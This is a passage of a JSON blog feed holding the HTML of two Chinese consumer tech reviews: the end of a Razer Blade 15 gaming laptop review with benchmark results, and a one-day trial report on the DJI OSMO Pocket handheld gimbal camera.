https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]